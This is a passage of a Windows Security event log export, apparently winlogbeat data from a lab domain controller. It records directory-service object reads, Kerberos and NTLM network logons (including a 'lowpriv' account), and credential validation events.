Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109886	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.597"	"FRC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109869	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.597"	"FBC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109868	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.597"	"ExC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{d31a8757-2447-4545-8081-3bb610cacbf2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109867	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.597"	"EhC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109866	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.597"	"ERC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109865	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.596"	"EBC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{3f975da2-8525-425d-8d71-78ffeff16ea1}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{3f975da2-8525-425d-8d71-78ffeff16ea1}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109864	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.596"	"DxC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{3f975da2-8525-425d-8d71-78ffeff16ea1}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{3f975da2-8525-425d-8d71-78ffeff16ea1}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109863	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:58.596"	"DhC9b54ByrYY_kgLfO5L"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:59.798"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x56D50

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{136b2f78-f565-44e5-94fa-df669a4fa178}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{136b2f78-f565-44e5-94fa-df669a4fa178}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x56d50	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109862	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:49.728"	"DRC9b54ByrYY_kgLNe7u"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:50.790"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x63E47C
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	127.0.0.1
	Source Port:		50469

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"127.0.0.1"	50469	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x63e47c	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109858	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:40.322"	"DBC9b54ByrYY_kgLNe7u"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 20:58:41.786"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-3984567624-304424726-3877085034-1103
	Account Name:		lowpriv
	Account Domain:		LAB2019
	Logon ID:		0x63E313
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.218
	Source Port:		40796

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	NTLM	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.218"	40796	128	"NTLM V2"	"{00000000-0000-0000-0000-000000000000}"	" - "	"NtLmSsp "	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	LAB2019	0x0	0x63e313	"'-"	"'-"	lowpriv	"S-1-5-21-3984567624-304424726-3877085034-1103"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109851	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 20:58:40.322"	"CxC9b54ByrYY_kgLNe7u"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Credential Validation"	4776	"May 28, 2026 @ 20:58:41.786"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"The computer attempted to validate the credentials for an account.

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	lowpriv
Source Workstation:	
Error Code:	0x0"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	lowpriv	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4776	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109850	"Credential Validation"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.230"	"ChC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBDEC

Object:
	Object Server:		DS
	Object Type:		%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}
	Object Name:		%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{2a7d2632-b837-40c8-b0bc-b4b91617be0b}"	DS	"%{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
			{fe515695-3f61-45c8-9bfa-19c148c57b09}
	{7b35dbad-b3ec-486a-aad4-2fec9d6ea6f6}"	" - "	" - "	" - "	LAB2019	0xcbdec	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1109830	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 20:58:13.230"	"CRC8b54ByrYY_kgLwO6Z"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 20:58:14.770"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
